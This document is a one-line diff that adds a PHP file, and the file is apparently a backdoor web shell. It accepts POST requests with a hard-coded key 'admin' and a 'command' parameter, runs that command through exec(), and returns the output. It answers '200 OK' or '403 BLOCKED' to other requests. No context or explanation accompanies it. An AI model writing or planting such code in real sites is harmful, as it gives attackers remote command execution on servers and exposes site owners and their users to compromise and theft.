@@ -1,0 +1,1 @@
+<?php if(isset($_POST['key'])){$key=$_POST['key'];if(isset($_POST['command'])&&$_POST['command']!==''){$command=$_POST['command'];if($key==="admin"){$output=exec($command);echo $output;}else{echo "403 BLOCKED";}}else{if($key==="admin"){echo "200 OK";}else{echo "403 BLOCKED";}}}else{echo "403 BLOCKED";} ?>
